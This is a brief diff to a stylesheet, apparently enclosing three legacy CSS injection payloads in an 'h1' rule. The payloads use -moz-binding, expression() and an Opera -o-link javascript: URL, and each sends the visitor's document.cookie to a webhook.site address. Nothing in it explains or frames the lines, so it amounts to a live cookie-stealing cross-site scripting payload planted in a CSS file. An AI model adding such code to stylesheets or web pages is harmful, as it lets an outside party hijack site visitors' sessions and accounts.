@@ -1,3 +1,5 @@
+h1 {
 -moz-binding:url('https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie);
 a:expression(document.location='https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie);
 -o-link:'javascript:document.location='https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie';-o-link-source:current
+}
